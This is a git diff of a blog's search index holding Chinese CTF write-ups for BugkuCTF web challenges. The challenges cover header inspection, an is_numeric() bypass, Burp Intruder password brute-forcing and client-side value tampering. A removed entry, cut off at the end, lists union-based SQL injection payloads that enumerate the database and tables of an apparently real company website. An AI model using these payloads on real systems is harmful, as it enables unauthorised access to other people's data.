-<p>++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<br>个人收获：脑洞啊！！！<br>++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
-<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>解题链接：<a href="http://123.206.87.240:9009/hd.php">http://123.206.87.240:9009/hd.php</a><br><img src="https://img-blog.csdnimg.cn/20190706134222359.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>打开链接，什么都没有，真的是什么都没有<br><img src="https://img-blog.csdnimg.cn/20190706134300261.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看源代码也是什么也没有<br><img src="https://img-blog.csdnimg.cn/2019070613433574.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>那就抓包看看<br><img src="https://img-blog.csdnimg.cn/2019070613442627.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>也没有，emm<br>再回去看看题目，头等舱，头等舱，头等舱，响应头？？？！！！<br>放到Repeater里面，Go以下，Response里面已经出来flag了</p>
-<h1 id="得到FLAG"><a href="#得到FLAG" class="headerlink" title="得到FLAG"></a>得到FLAG</h1><p><img src="https://img-blog.csdnimg.cn/20190706134700864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-]]></content>
-      <categories>
-        <category>CTF做题记录</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>BugkuCTF-web-矛盾 writeup</title>
-    <url>/2019/undefined/</url>
-    <content><![CDATA[<a id="more"></a>
-
-<p>++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++个人收获：绕过is_numeric() //判断参数是否为数字<br>++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
-<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p><img src="https://img-blog.csdnimg.cn/20190629164438134.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>打开链接，得到</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$num=$_GET[<span class="string">&#x27;num&#x27;</span>];<span class="comment">//GET方式得到参数num值</span></span><br><span class="line"><span class="keyword">if</span>(!is_numeric($num))<span class="comment">//判断num是否为数字，如果不是则输出num的值</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> $num;</span><br><span class="line"><span class="keyword">if</span>($num==<span class="number">1</span>)<span class="comment">//如果num==1则输出FLAG</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;flag&#123;**********&#125;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>num既要是1又要不是数字，这就是矛盾所在<br>那么晚们可以令<code>num=1xx</code>即可绕过验证，而又使num为1</p>
-<h1 id="得到FLAG"><a href="#得到FLAG" class="headerlink" title="得到FLAG"></a>得到FLAG</h1><p><img src="https://img-blog.csdnimg.cn/20190629164831239.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-]]></content>
-      <categories>
-        <category>CTF做题记录</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>BugkuCTF-web-网站被黑 writeup</title>
-    <url>/2019/undefined/</url>
-    <content><![CDATA[<a id="more"></a>
-
-<p>++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<br>个人收获：御剑拿后台，bp爆破<br>++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
-<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p><img src="https://img-blog.csdnimg.cn/20190709113146530.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>解题链接：<a href="http://123.206.87.240:8002/webshell/">http://123.206.87.240:8002/webshell/</a><br>打开链接有一个炫酷的网页，，，<br><img src="https://img-blog.csdnimg.cn/20190709113252714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>拿出御剑一顿扫描，得到后台网址<br><img src="https://img-blog.csdnimg.cn/20190709114114628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><a href="http://123.206.87.240:8002/webshell/shell.php">http://123.206.87.240:8002/webshell/shell.php</a><br><img src="https://img-blog.csdnimg.cn/20190709113443516.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这，，，爆破吧，掏出bp，抓包，丢到Intruder里面跑一下<br>设置爆破参数<br><img src="https://img-blog.csdnimg.cn/20190709114650315.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这个用默认字典就行，选password<br><img src="https://img-blog.csdnimg.cn/20190709114340129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点Start attack喝口茶，等着就行,记得按Length排序<br><img src="https://img-blog.csdnimg.cn/20190709115940287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>还没跑完就出密码了</p>
-<h1 id="得到FLAG"><a href="#得到FLAG" class="headerlink" title="得到FLAG"></a>得到FLAG</h1><p>密码：hack<br><img src="https://img-blog.csdnimg.cn/20190709120028443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-]]></content>
-      <categories>
-        <category>CTF做题记录</category>
-      </categories>
+      <tags>
+        <tag>CTF WEB</tag>
+      </tags>
   </entry>
   <entry>
     <title>BugkuCTF-web-点击一百万次 writeup</title>
-    <url>/2019/undefined/</url>
-    <content><![CDATA[<a id="more"></a>
-
-<p>++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<br>收获：控制台一样传参！<br>++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
+    <url>/2019/39DZ1JD/</url>
+    <content><![CDATA[<blockquote>
+<p>控制台一样传参！</p>
+</blockquote>
+<a id="more"></a>
+<hr>
 <h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>解题传送门：<a href="http://123.206.87.240:9001/test/">http://123.206.87.240:9001/test/</a><br><img src="https://img-blog.csdnimg.cn/20190711214329175.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p><img src="https://img-blog.csdnimg.cn/20190711214438287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>什么？？？让我点击一百万次？！都散了吧，要手的<br>滚回去看看提示，唔，JS啊，F12<br><img src="https://img-blog.csdnimg.cn/20190711214907857.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我把<code>clickcount</code>的值改为1000000了，没出flag，我真是疯了，想到这么蠢的方法，哈哈<br>打开我的火狐，post传参呐</p>
 <h1 id="得到FLAG"><a href="#得到FLAG" class="headerlink" title="得到FLAG"></a>得到FLAG</h1><p>方法一、<br>在浏览器控制台直接输入<code>clicks=1000000</code>再点击饼干刷新一下页面即可<br><img src="https://img-blog.csdnimg.cn/20190711215645897.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190711215703183.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>方法二、<br><img src="https://img-blog.csdnimg.cn/20190711215422942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
@@ -383,14 +409,17 @@
       <categories>
         <category>CTF做题记录</category>
       </categories>
+      <tags>
+        <tag>CTF WEB</tag>
+      </tags>
   </entry>
   <entry>
     <title>BugkuCTF-web-秋名山车神 writeup</title>
-    <url>/2019/undefined/</url>
-    <content><![CDATA[<a id="more"></a>
-
-<hr>
+    <url>/2019/C7SS0W/</url>
+    <content><![CDATA[<blockquote>
 <p>脚本能力+0.001<br>快速反弹POST请求<br>另：<a href="https://blog.csdn.net/weixin_43578492/article/details/101705708">bugku 速度要快</a></p>
+</blockquote>
+<a id="more"></a>
 <hr>
 <h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p><a href="http://123.206.87.240:8002/qiumingshan/">题目链接</a><br><img src="https://img-blog.csdnimg.cn/20190929170225778.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>本题考验脚本能力，手动提交？哼，不存在的<br>题目多次刷新，出现要提交的参数：<code>value</code><br><img src="https://img-blog.csdnimg.cn/20190929170443382.png" alt="在这里插入图片描述"><br>这么长的数字计算器算都可能溢出，所以上脚本，本题采用正则表达式，如果不熟悉这个可以先看看教程：<a href="https://www.runoob.com/regexp/regexp-tutorial.html">正则教程</a></p>
@@ -407,13 +436,72 @@
       <categories>
         <category>CTF做题记录</category>
       </categories>
+      <tags>
+        <tag>CTF WEB</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BugkuCTF-web-矛盾 writeup</title>
+    <url>/2019/20HJKXZ/</url>
+    <content><![CDATA[<blockquote>
+<p>绕过is_numeric() //判断参数是否为数字</p>
+</blockquote>
+<a id="more"></a>
+<hr>
+<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p><img src="https://img-blog.csdnimg.cn/20190629164438134.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>打开链接，得到</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$num=$_GET[<span class="string">&#x27;num&#x27;</span>];<span class="comment">//GET方式得到参数num值</span></span><br><span class="line"><span class="keyword">if</span>(!is_numeric($num))<span class="comment">//判断num是否为数字，如果不是则输出num的值</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> $num;</span><br><span class="line"><span class="keyword">if</span>($num==<span class="number">1</span>)<span class="comment">//如果num==1则输出FLAG</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;flag&#123;**********&#125;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>num既要是1又要不是数字，这就是矛盾所在<br>那么晚们可以令<code>num=1xx</code>即可绕过验证，而又使num为1</p>
+<h1 id="得到FLAG"><a href="#得到FLAG" class="headerlink" title="得到FLAG"></a>得到FLAG</h1><p><img src="https://img-blog.csdnimg.cn/20190629164831239.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+]]></content>
+      <categories>
+        <category>CTF做题记录</category>
+      </categories>
+      <tags>
+        <tag>CTF WEB</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BugkuCTF-web-计算器 writeup</title>
+    <url>/2019/246Q01Y/</url>
+    <content><![CDATA[<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>解题链接：<a href="http://123.206.87.240:8002/yanzhengma/">http://123.206.87.240:8002/yanzhengma/</a><br><img src="https://img-blog.csdnimg.cn/20190624140921901.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<a id="more"></a>
+<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p><code>解法一、</code><br><img src="https://img-blog.csdnimg.cn/2019062414101817.png" alt="在这里插入图片描述"><br>随机运算，但是只能输入一个数值，按F12看源代码可知，输入长度被限制为1<br><img src="https://img-blog.csdnimg.cn/20190624141520806.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>将<code>1</code>改为<code>9</code>，再次输入即可得到FLAG<br><code>解法二、</code><br>这是我无意间知道的<br>F12-source-js-code.js<br><img src="https://img-blog.csdnimg.cn/20190624142257749.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+]]></content>
+      <categories>
+        <category>CTF做题记录</category>
+      </categories>
+      <tags>
+        <tag>CTF WEB</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BugkuCTF-web-网站被黑 writeup</title>
+    <url>/2019/3YD31B9/</url>
+    <content><![CDATA[<blockquote>
+<p>御剑拿后台，bp爆破</p>
+</blockquote>
+<a id="more"></a>
+<hr>
+<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p><img src="https://img-blog.csdnimg.cn/20190709113146530.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>解题链接：<a href="http://123.206.87.240:8002/webshell/">http://123.206.87.240:8002/webshell/</a><br>打开链接有一个炫酷的网页，，，<br><img src="https://img-blog.csdnimg.cn/20190709113252714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>拿出御剑一顿扫描，得到后台网址<br><img src="https://img-blog.csdnimg.cn/20190709114114628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><a href="http://123.206.87.240:8002/webshell/shell.php">http://123.206.87.240:8002/webshell/shell.php</a><br><img src="https://img-blog.csdnimg.cn/20190709113443516.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这，，，爆破吧，掏出bp，抓包，丢到Intruder里面跑一下<br>设置爆破参数<br><img src="https://img-blog.csdnimg.cn/20190709114650315.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这个用默认字典就行，选password<br><img src="https://img-blog.csdnimg.cn/20190709114340129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点Start attack喝口茶，等着就行,记得按Length排序<br><img src="https://img-blog.csdnimg.cn/20190709115940287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>还没跑完就出密码了</p>
+<h1 id="得到FLAG"><a href="#得到FLAG" class="headerlink" title="得到FLAG"></a>得到FLAG</h1><p>密码：hack<br><img src="https://img-blog.csdnimg.cn/20190709120028443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+]]></content>
+      <categories>
+        <category>CTF做题记录</category>
+      </categories>
+      <tags>
+        <tag>CTF WEB</tag>
+      </tags>
   </entry>
   <entry>
     <title>BugkuCTF-web-输入密码查看flag writeup</title>
-    <url>/2019/undefined/</url>
-    <content><![CDATA[<a id="more"></a>
-
-<p>++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<br>个人收获：没什么，还是爆破<br>++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
+    <url>/2019/257E4WN/</url>
+    <content><![CDATA[<blockquote>
+<p>没什么，还是爆破</p>
+</blockquote>
+<a id="more"></a>
+<hr>
 <h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>解题链接：<a href="http://123.206.87.240:8002/baopo/">http://123.206.87.240:8002/baopo/</a><br><img src="https://img-blog.csdnimg.cn/20190711211159890.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p><img src="https://img-blog.csdnimg.cn/201907112114098.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>5位密码，URL有提示，直接bp爆破吧<br>抓包，放到Intruder里<br><img src="https://img-blog.csdnimg.cn/20190711211721392.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>改参，一个变量<br><img src="https://img-blog.csdnimg.cn/20190711211832982.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>构造Payload，由于是五位数密码，直接遍历10000–&gt;99999好了<br>以下为设置方法<br><img src="https://img-blog.csdnimg.cn/20190711213925145.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>Start attack即可，记得按Length排序，容易看出爆破成功没有<br>喝口水，等会就行<br><img src="https://img-blog.csdnimg.cn/2019071121360931.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <h1 id="得到FLAG"><a href="#得到FLAG" class="headerlink" title="得到FLAG"></a>得到FLAG</h1><p>密码：13579<br><img src="https://img-blog.csdnimg.cn/20190711213650181.png" alt="在这里插入图片描述"></p>
@@ -421,45 +509,17 @@
       <categories>
         <category>CTF做题记录</category>
       </categories>
-  </entry>
-  <entry>
-    <title>BugkuCTF-web-计算器 writeup</title>
-    <url>/2019/undefined/</url>
-    <content><![CDATA[<a id="more"></a>
-
-<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>解题链接：<a href="http://123.206.87.240:8002/yanzhengma/">http://123.206.87.240:8002/yanzhengma/</a><br><img src="https://img-blog.csdnimg.cn/20190624140921901.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p><code>解法一、</code><br><img src="https://img-blog.csdnimg.cn/2019062414101817.png" alt="在这里插入图片描述"><br>随机运算，但是只能输入一个数值，按F12看源代码可知，输入长度被限制为1<br><img src="https://img-blog.csdnimg.cn/20190624141520806.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>将<code>1</code>改为<code>9</code>，再次输入即可得到FLAG<br><code>解法二、</code><br>这是我无意间知道的<br>F12-source-js-code.js<br><img src="https://img-blog.csdnimg.cn/20190624142257749.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-]]></content>
-      <categories>
-        <category>CTF做题记录</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>BugkuCTF-web进阶-实战2-注入 writeup</title>
-    <url>/2019/undefined/</url>
-    <content><![CDATA[<a id="more"></a>
-
-<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><ul>
-<li>解题传送门：<a href="http://www.kabelindo.co.id/">http://www.kabelindo.co.id/</a><br><img src="https://img-blog.csdnimg.cn/20190714094244224.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><img src="https://img-blog.csdnimg.cn/20190714094229131.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开链接后得到个这个页面，注入，，，我一开始在搜索框内随意试试，发现没什么用，抓包也没啥结果。然后就逛逛这个网站看看哪里有注入点，找了一会，在页面的About-News里面发现数字型注入，话不多说，开始<br><img src="https://img-blog.csdnimg.cn/20190714094623612.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>注入嘛，老套路，两种方法</li>
-<li>法一、手工注入<br>猜字段<code>http://www.kabelindo.co.id/readnews.php?id=28 order by 5</code>正常<br><img src="https://img-blog.csdnimg.cn/20190714095412605.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><code>http://www.kabelindo.co.id/readnews.php?id=28 order by 6</code><br>报错，字段为5<br><img src="https://img-blog.csdnimg.cn/20190714095450115.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看字段回显(记得把id置为无用数值，不然会掩盖后面的查询结果)<br><code>http://www.kabelindo.co.id/readnews.php?id=-1 union select 1,2,3,4,5</code><br><img src="https://img-blog.csdnimg.cn/20190714095700547.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>暴数据库<code>http://www.kabelindo.co.id/readnews.php?id=-1 union select 1,database(),3,4,5</code><br>得到数据库<code>u9897uwx_kabel</code><br><img src="https://img-blog.csdnimg.cn/20190714095853519.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>暴表名<code>http://www.kabelindo.co.id/readnews.php?id=-1 union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema=database()</code><br><img 